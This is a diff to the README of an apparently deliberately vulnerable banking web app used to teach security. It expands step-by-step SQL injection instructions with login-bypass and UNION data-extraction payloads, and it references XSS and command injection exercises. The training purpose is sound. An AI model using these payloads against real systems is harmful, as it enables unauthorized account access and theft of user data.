@@ -53,14 +53,34 @@ A **deliberately broken** banking website designed to teach cybersecurity by let
 
 **What it is:** Tricking the database by inserting special code into login forms.
 
-**How to do it:**
-1. Go to the login page
-2. **Username:** `admin'--`
-3. **Password:** `anything` (literally type "anything")
-4. Click Login
-5. **Result:** You're logged in as admin without the real password!
+#### **Working SQL Injection Commands:**
 
-**Why it works:** The `--` makes the database ignore the password check.
+**Username Field Injections:**
+1. **Basic Bypass:** `admin' OR 1=1 --`
+2. **Comment Bypass:** `admin'--`
+3. **Union Extraction:** `' UNION SELECT * FROM users --`
+
+**Password Field Injections:**
+1. **Basic Bypass:** `' OR 1=1 --`
+
+#### **How to Test:**
+
+**Method 1 - Username Bypass:**
+1. **Username:** `admin' OR 1=1 --`
+2. **Password:** `anything`
+3. **Result:** Bypasses authentication completely
+
+**Method 2 - Password Bypass:**
+1. **Username:** `admin`
+2. **Password:** `' OR 1=1 --`
+3. **Result:** Bypasses password check
+
+**Method 3 - Data Extraction:**
+1. **Username:** `' UNION SELECT * FROM users --`
+2. **Password:** `anything`
+3. **Result:** Attempts to extract user data
+
+**Why it works:** The `OR 1=1` makes the condition always true, and `--` comments out the rest of the query.
 
 ---
 
@@ -76,7 +96,7 @@ A **deliberately broken** banking website designed to teach cybersecurity by let
 5. **Result:** Every time someone views your profile, they see a "HACKED!" popup
 
 **Method 2 - Transfer Page XSS:**
-1. Login to the bank
+1. Login to the bank (use SQL injection: `admin' OR 1=1 --`)
 2. Go to **Transfer Money** page
 3. In the **Search Users** field, paste: `<img src=x onerror=alert('XSS in Search!')>`
 4. Click Search
@@ -156,7 +176,7 @@ fetch('http://localhost:5000/api/user/1', {
 **What it is:** Making the server run commands by inserting special code.
 
 **How to do it:**
-1. Login to the bank
+1. Login to the bank (use SQL injection: `admin' OR 1=1 --`)
 2. Go to **Transaction History** page
 3. In the **Search Transactions** field, type any of these commands:
 4. Submit
